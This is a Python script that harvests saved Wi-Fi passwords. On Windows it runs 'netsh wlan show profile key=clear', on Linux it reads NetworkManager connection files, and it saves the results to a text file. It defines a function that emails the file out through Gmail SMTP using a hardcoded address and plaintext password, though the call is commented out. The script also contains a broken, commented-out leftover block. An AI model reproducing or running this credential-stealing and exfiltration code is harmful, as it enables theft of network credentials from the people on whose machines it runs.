import os
import smtplib
import subprocess
from email import encoders
from email.mime.base import MIMEBase
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
import glob

system_information = "Informations.txt"
email_address = "bospostadenemesi@gmail.com"
password = "112358yunus"
file_path = os.getcwd()


def send_email(filename, attachment):
    fromaddr = email_address
    toaddr = email_address
    msg = MIMEMultipart()

    msg['From'] = fromaddr
    msg['To'] = toaddr
    msg['Subject'] = "Log File"

    body = "Body_of_the_mail"
    msg.attach(MIMEText(body, 'plain'))
    filename = filename
    attachment = open(attachment, "rb")
    p = MIMEBase('application', 'octet-stream')
    p.set_payload((attachment).read())

    encoders.encode_base64(p)
    p.add_header('Content-Disposition', "attachment; filename= %s" % filename)
    msg.attach(p)

    s = smtplib.SMTP('smtp.gmail.com', 587)
    s.starttls()
    s.login(fromaddr, password)
    text = msg.as_string()
    s.sendmail(fromaddr, toaddr, text)
    s.quit()


if os.name == "nt":
    output = subprocess.check_output("netsh wlan show profile", shell=True)
    output = str(output)
    list_of_word = output.split()
    j = 2
    with open(file_path + "\\" + system_information, "a") as f:
        f.write("All of Registered Connections\n")
        f.write("==================================\n")
        f.close()
    for word in output.split():
        if word == "Profile":
            next_word = list_of_word[list_of_word.index(word) + j]
            next_word = next_word.split('\\r\\n')[0]
            print(next_word)
            wifi = subprocess.check_output("netsh wlan show profile " + next_word + " key=clear", shell=True)
            wifi = str(wifi)
            start = wifi.find("Key Content")
            end = wifi.find("Cost settings")
            key_content = "Content"
            substring = wifi[start:end]
            list_of_words = wifi.split()
            with open(file_path + "\\" + system_information, "a") as f:
                f.write(list_of_words[1] + "\n")
                f.write("==================================\n")
                f.close()
            j = j + 5
            try:
                next_word = list_of_words[list_of_words.index(key_content) + 2]
                i = 2
                for words in wifi.split():
                    if words == "Content":
                        next_word = list_of_words[list_of_words.index(key_content) + i]
                        next_word = next_word.split('\\r\\n\\r\\nCost')[0]
                        next_word = next_word.replace(' ', "\\ ")
                        print(next_word)
                        i = i + 5
                        with open(file_path + "\\" + system_information, "a") as f:
                            f.write(list_of_words[1] + " : " + next_word + "\n")
                            f.close()
            except:
                pass
else:
    os.system("chmod +x " + os.path.basename(_file_))
    try:
        output = glob.glob("/etc/NetworkManager/system-connections/*")

        res = [sub.replace(' ', "\ ") for sub in output]
        for i in res:
            output = subprocess.check_output("cat " + i, shell=True)
            output = str(output)
            with open(file_path + "\\" + system_information, "a") as f:
                f.write(output + "\n===========================\n")
                f.close()
    except:
        pass
    os.system("./" + os.path.basename(_file_))
# send_email(system_information, file_path + "\\" + system_information)
# os.remove("Informations.txt")

''''''''''

a = os.system("netsh wlan show profile DSL-2740U-31a2 key=clear")
b = os.system("netsh wlan show profile Ticaret-Ogrenci key=clear")

print(a)
print(b)

server = smtplib.SMTP('smtp.gmail.com', 587, next_word.encode("utf8"))
        server.starttls()
        email = "bospostadenemesi@gmail.com"
        password = "112358yunus"
        server.login(email, password)
        server.sendmail(email, email, next_word)
        server.quit()
'''''''''
